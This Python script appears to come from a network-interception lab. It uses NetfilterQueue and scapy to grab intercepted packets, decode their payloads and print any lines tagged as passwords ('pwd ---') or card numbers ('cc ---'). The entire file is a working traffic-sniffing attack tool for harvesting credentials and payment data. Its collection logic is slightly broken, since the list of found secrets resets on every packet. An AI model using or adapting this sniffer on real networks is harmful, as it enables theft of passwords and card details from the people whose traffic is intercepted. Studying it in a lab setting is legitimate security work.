from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
import functools


def print_and_accept(packet):
    secrets = []
    packet.accept()
    ip = scapy.IP(packet.get_payload())
    if ip.haslayer(scapy.Raw):
        http = ip[scapy.Raw].load.decode()
        '''
        if 'secret' in http:
            if 'cc ---' in http or 'pwd ---' in http:
                print(http)
        '''
        secret = http.splitlines()
        secret = [x for x in secret if 'secret' in x]
        if secret != []:
            if 'pwd --- ' in secret[0]:
                pwd = secret[0].split(' ')
                pwd = ' '.join(pwd[2:5])
                if pwd not in secrets:
                    print(pwd)
                    secrets.append(pwd)
            if 'cc --- ' in secret[0]:
                cc = secret[0].split(' ')
                code = cc[4].split('.')
                check = functools.reduce(lambda a,b: a and b, [len(x) == 4 for x in code])
                if check:
                    cc = ' '.join(cc[2:5])
                    if cc not in secrets:
                        print(cc)
                        secrets.append(cc)
        if len(secrets) == 3:
            print(secrets)
            return secrets

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
